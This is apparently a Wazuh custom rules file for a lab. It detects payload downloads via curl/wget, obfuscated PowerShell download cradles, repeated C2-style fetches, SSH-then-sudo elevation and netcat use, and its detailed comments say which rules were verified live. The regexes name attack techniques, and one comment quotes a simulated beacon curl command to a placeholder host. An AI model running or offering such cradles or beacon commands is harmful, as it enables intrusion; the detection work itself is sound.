<group name="local,pfa_custom,">

  <!-- Anchored on Wazuh's own native command-audit mechanism (rule 80792, key "audit-wazuh-c" from the
       official etc/lists/audit-keys CDB list) rather than a home-made field match on a raw audit key name.
       This is the officially documented Wazuh/auditd integration path.

       The audit source itself is pre-merged by a small local service (audit_merge.py, systemd unit
       systemd/audit-merge.service in this repo) that concatenates the SYSCALL/EXECVE/CWD/PATH/PROCTITLE
       records sharing the same audit(...) id into a single line, matching the format Wazuh's own auditd
       decoder documents and expects (see /var/ossec/ruleset/decoders/0040-auditd_decoders.xml) but which
       the raw /var/log/audit/audit.log never actually produces on its own (it writes one line per record
       type). Without this merge, the EXECVE arguments (URL, encoded command) never reach full_log, and
       any downstream consumer (rule engine, LLM, human analyst) is blind to the actual command content.

       Revision note (2026-07): the original v1 rules for 100099/100101/100103/100105 matched only on
       audit.command (the bare process name), with no inspection of the command's actual arguments or of
       correlation context. That meant a legitimate `curl` or a benign `pwsh` invocation would trigger the
       same high-severity alert as an actual payload retrieval or an obfuscated encoded command, and the
       "beaconing"/"lateral movement" rules only checked *frequency of the same rule ID*, never destination
       or session identity. v2 splits each detection into a low-severity baseline rule (process executed,
       nothing more implied) and a higher-severity rule requiring an actual suspicious indicator.

       Revision note 2 (deployed and verified live on this VM via wazuh-logtest, not assumed): the first
       attempt at v2 used <field name="full_log" type="pcre2">...</field> for 100099/100101, which loads
       without any syntax error but NEVER MATCHES for auditd-decoded events - "full_log" is not a
       queryable field for this decoder in this Wazuh version (confirmed by testing a trivial single-token
       pattern in isolation: it still never matched, on a log line that visibly contained the token).
       Fixed by switching to a bare <regex type="pcre2"> (no field= attribute), which matches against the
       raw pre-decoded log line and was confirmed working via wazuh-logtest against real captured
       audit.execve output, including a case-insensitivity check (uppercase ".SH" matched the
       case-insensitive PCRE2 pattern correctly). This is now a verified finding, not a guess: the same
       "field name=full_log" mistake would silently produce a rule that always loads cleanly and never
       fires, which is worse than a loud failure - always test a new field-matching rule against a real
       captured log line via wazuh-logtest before trusting it. -->

  <!-- ===================== T1105 - network fetch / tool retrieval ===================== -->

  <rule id="100098" level="3">
    <if_sid>80792</if_sid>
    <field name="audit.command">^curl$|^wget$</field>
    <description>Network fetch executed (curl/wget) - informational baseline, not itself suspicious</description>
    <group>audit_command,pfa_baseline,</group>
  </rule>

  <rule id="100099" level="8">
    <if_sid>100098</if_sid>
    <regex type="pcre2">(?i)\.(sh|ps1|exe|elf|bin)(["'\s]|$)|/tmp/|/dev/shm/|-o\s+/(tmp|dev/shm)</regex>
    <description>Network fetch (curl/wget) retrieving a script/executable to a suspicious path - possible external tool/payload retrieval</description>
    <mitre>
      <id>T1105</id>
    </mitre>
    <group>audit_command,pfa_phishing,</group>
  </rule>

  <!-- ===================== T1059.001 - suspicious/obfuscated PowerShell ===================== -->

  <rule id="100100" level="3">
    <if_sid>80792</if_sid>
    <field name="audit.command">^pwsh$|^powershell$</field>
    <description>PowerShell execution detected via auditd - informational baseline, not itself suspicious</description>
    <group>audit_command,pfa_baseline,</group>
  </rule>

  <rule id="100101" level="12">
    <if_sid>100100</if_sid>
    <regex type="pcre2">(?i)-enc(odedcommand)?\b|invoke-expression|\biex\b|downloadstring|net\.webclient|-executionpolicy\s+bypass</regex>
    <description>Suspicious/obfuscated PowerShell execution (encoded command, IEX, download cradle, or execution-policy bypass) detected via auditd</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>audit_command,pfa_powershell,</group>
  </rule>

  <!-- ===================== T1071 - repeated fetches to the SAME destination (C2 beaconing) =====================
       same_field enforces that all matched occurrences share the identical value of the given
       audit.execve argument index (the fetch URL/destination), not merely that a fetch fired 3 times
       against ANY targets - this is the fix for "detects a curl burst, not real beaconing" (see revision
       note above).

       Chained on 100098 (bare fetch), NOT 100099 (fetch with a suspicious extension/path) - found and
       fixed after testing live via wazuh-logtest: real C2 check-in URLs typically look like
       "/checkin", "/beacon", "/poll" (see generate_advanced_scenarios.sh), which never match 100099's
       suspicious-extension regex, so a rule chained on 100099 would never have a beaconing pattern to
       correlate against in practice. Repeated identical-destination fetches are themselves the
       suspicious signal here, independent of whether any single fetch also looks like a payload
       download - chaining on the baseline rule is the correct scope.

       CONFIRMED BUG (found by re-reading generate_advanced_scenarios.sh, not by live testing): the
       previous revision used audit.execve.a1 and claimed this was the URL position for the repo's own
       C2 scenario script. That is wrong. The script actually runs:
           curl -s -m3 "http://c2-beacon-simulated.example.invalid/${p}?id=$i&t=$(date +%s)"
       which decomposes as a0=curl, a1=-s, a2=-m3, a3=<url> - so same_field was comparing "-s" (always
       identical across every curl invocation, regardless of destination), not the URL. The rule would
       have fired on 3 fetches to 3 DIFFERENT destinations just as readily as 3 fetches to the same one,
       which defeats the entire point of this rule (see revision note above). The manual wazuh-logtest
       session that "confirmed" a1 during the earlier live-verification pass used a simpler manual curl
       invocation (curl -s <url>, no -m3) that happens to put the URL at a1 - it did not exercise the
       actual generator script's argument order, so that verification was real but did not cover the
       case that matters. Corrected to audit.execve.a3 to match generate_advanced_scenarios.sh as it
       exists today.

       This positional match remains inherently fragile: ANY change to the flag order in the curl/wget
       invocation (a different scenario script, a real attacker's tooling, a different curl version's
       default flag placement) silently shifts the URL to a different aN index and this rule stops
       correlating correctly - with no error, no warning, just silent false negatives (or worse, false
       correlation on a shared flag value, as happened here). The robust fix is a custom Wazuh decoder
       that extracts the URL via a single regex against full_log into a stable, position-independent
       field (e.g. a normalized "pfa.destination") and correlates on that field instead of a raw
       audit.execve.aN index - out of scope for this pass (requires deploying and testing a new decoder
       on the VM, not just a rule change) but the correct long-term direction. Until then: re-verify the
       exact aN index against a live audit.execve sample from the CURRENT scenario script before trusting
       this rule, every time the script's curl/wget invocation changes.

       STATUS: this a1->a3 fix has been applied here but NOT YET re-verified live on the VM (SSH key
       access to the lab VM was unavailable during this pass - see README). Do not cite this rule as
       "verified" for C2 beaconing until it has been retested with wazuh-logtest against the exact
       generate_advanced_scenarios.sh invocation, including a negative case (3 fetches to 3 DIFFERENT
       destinations must NOT fire 100103). -->

  <rule id="100103" level="10" frequency="3" timeframe="90">
    <if_matched_sid>100098</if_matched_sid>
    <same_field>audit.execve.a3</same_field>
    <description>Repeated network fetch commands to the same destination in a short window (possible C2 beaconing) - positional match on audit.execve.a3, fragile to argument order, see comment above</description>
    <mitre>
      <id>T1071</id>
    </mitre>
    <group>audit_command,pfa_c2_beaconing,</group>
  </rule>

  <!-- ===================== T1021.004 - SSH login followed by root elevation, time-proximity only =====================
       Revision 3, fully verified live on the VM via wazuh-logtest (all three prior assumptions were
       wrong, each found by actually deploying and testing, not by reading the XML and assuming it would
       work):
         1. frequency="1" is rejected by Wazuh at config-load time (minimum is 2) - caught immediately
            by `wazuh-analysisd -t`.
         2. <same_source_ip/> can never match: rule 5402 ("Successful sudo to ROOT executed") is decoded
            by ruleset/decoders/0320-sudo_decoders.xml, which only extracts srcuser - sudo runs in an
            already-open local terminal session and has no network source, so srcip is never populated.
         3. <same_user/> was tried next on the theory that both events populate a "user" field for the
            same local account (soc). This is also confirmed wrong: rule 5715's sshd decoder stores the
            logged-in account as dstuser ("the user being logged into"), while rule 5402's sudo decoder
            stores the SAME physical account as srcuser ("the user invoking sudo") and the elevation
            target ("root") as dstuser. These are different field ROLES holding the value "soc" on one
            side and "root" on the other for dstuser, so no single same_* field directive can bridge them
            - confirmed empirically: removing <same_user/> and testing a real SSH-accept + sudo-to-root
            sequence via wazuh-logtest correctly produced the alert; adding <same_user/> back made it
            silently stop firing, on the identical input. Wazuh's native same_* primitives (same_field,
            same_source_ip, same_user, ...) each compare one identical field name across both matched
            events - they cannot cross-reference dstuser on one rule against srcuser on another. Bridging
            them natively would require writing a custom decoder that copies the sshd dstuser into a
            normalized field also used by the sudo decoder, which is a real fix but bigger in scope than
            a rule-file change and was not attempted here.
       Corrected to drop the user-identity correlation entirely and rely on TIME PROXIMITY alone (a
       sudo-to-root within 120s of an SSH accept, anywhere on the host) - a weaker signal than
       "same user", explicitly accepted as a known limitation: on a genuinely multi-user host, two
       different users independently SSH-ing in and using sudo within the same 120s window would produce
       a false positive here. On this single-account lab VM the distinction is moot, which is exactly why
       this gap was easy to miss without live testing. -->

  <rule id="100105" level="10" frequency="2" timeframe="120">
    <if_sid>5402</if_sid>
    <if_matched_sid>5715</if_matched_sid>
    <description>Sudo elevation to root shortly after an SSH login on the same host (possible lateral movement; time-proximity only, not confirmed same user - see comment above)</description>
    <mitre>
      <id>T1021.004</id>
    </mitre>
    <group>pfa_lateral_movement,</group>
  </rule>

  <!-- ===================== T1046 - network probing / port scan ===================== -->

  <rule id="100107" level="6">
    <if_sid>80792</if_sid>
    <field name="audit.command">^nc$|^ncat$|^netcat$</field>
    <description>Network probing tool executed (nc/ncat) - possible port scan / service discovery</description>
    <mitre>
      <id>T1046</id>
    </mitre>
    <group>audit_command,pfa_recon,</group>
  </rule>

</group>
